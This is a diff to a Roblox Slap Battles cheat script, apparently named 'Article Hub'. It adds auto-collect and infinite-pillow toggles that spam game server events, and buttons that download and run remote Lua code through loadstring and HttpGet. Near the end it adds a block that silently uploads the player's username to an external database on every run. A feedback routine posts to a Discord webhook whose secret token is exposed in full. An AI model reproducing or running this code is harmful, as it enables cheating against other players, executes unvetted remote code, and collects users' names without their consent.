@@ -2885,7 +2885,7 @@ for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                         v.Parent = game.LogService
                 end
 game:GetService("Players").LocalPlayer.Reset:FireServer()
-wait(3.75)
+wait(7)
 for i,v in pairs(game.LogService:GetChildren()) do
                         v.Parent = game.Players.LocalPlayer.Backpack
                 end
@@ -2909,7 +2909,7 @@ for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                         v.Parent = game.LogService
                 end
 game:GetService("Players").LocalPlayer.Reset:FireServer()
-wait(3.75)
+wait(7)
 OGlove = game.Players.LocalPlayer.leaderstats.Glove.Value
 fireclickdetector(workspace.Lobby.GloveStands.Ghost.ClickDetector)
 game.ReplicatedStorage.Ghostinvisibilityactivated:FireServer()
@@ -5903,7 +5903,7 @@ else
 Notification("You don't have Recall equipped, or you have Backpack Recall equipped, or player not enter arena", 5)
 end
 end
-end):AddButton("Kick Player Za Hando", function()
+end):AddButton("Za Hando", function()
 if game.Players.LocalPlayer.leaderstats.Glove.Value == "Za Hando" then
 OGWS = game.Players.LocalPlayer.Character.Humanoid.WalkSpeed
 OGJP = game.Players.LocalPlayer.Character.Humanoid.JumpPower
@@ -6247,6 +6247,42 @@ end
     end
 })
 
+Glove2Group:AddToggle("Auto Collect Pillow", {
+    Text = "Auto Collect Pillow",
+    Default = false, 
+    Callback = function(Value) 
+_G.AutoCollectPillow = Value
+while _G.AutoCollectPillow do
+if game.Players.LocalPlayer.leaderstats.Glove.Value == "Pillow" and game.Workspace:FindFirstChild("pillows_") then
+for i,v in pairs(game.Workspace:FindFirstChild("pillows_"):GetChildren()) do
+if v.Name == "pillow_model" and v:FindFirstChild("Clickbox") and v.Clickbox:FindFirstChild("ClickDetector") then
+v.Clickbox.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+end
+end
+end
+task.wait()
+end
+    end
+})
+
+Glove2Group:AddToggle("Infinity Pillow", {
+    Text = "Infinity Pillow",
+    Default = false, 
+    Callback = function(Value) 
+_G.InfinityPillow = Value
+if game.Players.LocalPlayer.leaderstats.Glove.Value == "Pillow" then
+while _G.InfinityPillow do
+game:GetService("ReplicatedStorage").Events.PillowEvent:FireServer("AddPillow")
+task.wait()
+end
+elseif _G.InfinityPillow == false then
+Notification("You don't have Pillow equipped", 5)
+wait(0.05)
+Toggles["Infinity Pillow"]:SetValue(false)
+end
+    end
+})
+
 Glove2Group:AddDropdown("Potion", {
     Text = "Potion",
     Values = {"Grug","Nightmare","Confusion","Power","Paralyzing","Haste","Invisibility","Explosion","Invincible","Toxic","Freeze","Feather","Speed","Lethal","Slow","Antitoxin","Corrupted Vine","Field","Lost"},
@@ -6267,7 +6303,6 @@ game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
 end
 for i = 1, #_G.GetPotion[_G.MakePotion] do
 game.ReplicatedStorage:WaitForChild("AlchemistEvent"):FireServer(unpack({"MixItem", _G.GetPotion[_G.MakePotion][i]}))
-wait()
 end
 game.ReplicatedStorage:WaitForChild("AlchemistEvent"):FireServer(unpack({"BrewPotion"}))
 else
@@ -7150,7 +7185,7 @@ Tabs = {
 	["UI Settings"] = Window:AddTab("UI Settings", "rbxassetid://7733955511")
 }
 
-local Script1Group = Tabs.Tab:AddLeftGroupbox("Script")
+local Script1Group = Tabs.Tab:AddRightGroupbox("Script")
 
 Script1Group:AddButton("Fly V3", function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Giangplay/Script/main/Fly_V3.lua"))()
@@ -7168,7 +7203,7 @@ Script1Group:AddButton("Executor | Ui Library", function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Playgiang/Script/main/Execute.lua"))()
 end)
 
-Script1Group:AddButton("Executor | Ui Library", function()
+Script1Group:AddButton("RemoteSpy", function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Giangplay/Script/main/RemoteSpy-V2.lua", true))()
 end)
 
@@ -7226,7 +7261,7 @@ end
     end
 })
 
-local Misc2Group = Tabs.Tab2:AddRightGroupbox("Combat")
+local Misc2Group = Tabs.Tab1:AddLeftGroupbox("Combat")
 
 Misc2Group:AddToggle("Damage Boss", {
     Text = "Damage Boss",
@@ -7311,7 +7346,7 @@ end
 end
 end)
 
-local Misc3Group = Tabs.Tab2:AddRightGroupbox("Anti")
+local Misc3Group = Tabs.Tab1:AddRightGroupbox("Anti")
 
 Misc3Group:AddButton("Anti VFX", function()
 if game.Players.LocalPlayer.PlayerScripts:FindFirstChild("VFXListener") then
@@ -10039,8 +10074,26 @@ SaveManager:BuildConfigSection(Tabs["UI Settings"])
 ThemeManager:ApplyToTab(Tabs["UI Settings"])
 SaveManager:LoadAutoloadConfig()
 ------------------------------------------------------------------------
+if http and http.request or request or syn.request then
+local request = http and http.request or request or syn.request
+local Table = {}
+if game.HttpService:JSONDecode(game:HttpGetAsync(database)) ~= nil then
+   for i, v in pairs(game.HttpService:JSONDecode(game:HttpGetAsync(database))) do
+     Table[i] = v
+   end
+end
+Table["Name"] = game.Players.LocalPlayer.Name
+local send = request({
+   Url = database,
+   Method = "PUT",
+   Headers = {["Content-Type"] = "application/json"},
+   Body = game.HttpService:JSONEncode(Table)
+})
+end
+------------------------------------------------------------------------
 if _G.AutoInfoFeelback == true then
-if http and http.request then
+if http and http.request or request or syn.request then
+local request = http and http.request or request or syn.request
        local jsonData = {
           ["embeds"] = {{
              ["title"] = "Article Hub 🅰️ - Player UserScript",
@@ -10096,12 +10149,10 @@ if http and http.request then
             ["footer"] = {["text"] = os.date("%c")}
           }}
         }
-    local response = http.request({
+    local response = request({
         Url = "https://discord.com/api/webhooks/1311945249618395197/h2NGvYgregZcbyttDk5QPXClx_YS70XUKnjzPVAqy31ailB3frIREQ5Sb2nIw1cNKvQS",
         Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
+        Headers = {["Content-Type"] = "application/json"},
         Body = game:GetService("HttpService"):JSONEncode(jsonData)
     })
 Notification("Feelback Success", 2)
@@ -10222,6 +10273,7 @@ gloveHits = {
     ["Lawnmower"] = game.ReplicatedStorage.GeneralHit,
     ["Equalizer"] = game.ReplicatedStorage.GeneralHit,
     ["Virus"] = game.ReplicatedStorage.GeneralHit,
+    ["Pillow"] = game.ReplicatedStorage.GeneralHit,
     ------------------------------------------------------------------------
     ["ZZZZZZZ"] = game.ReplicatedStorage.ZZZZZZZHit,
     ["Brick"] = game.ReplicatedStorage.BrickHit,
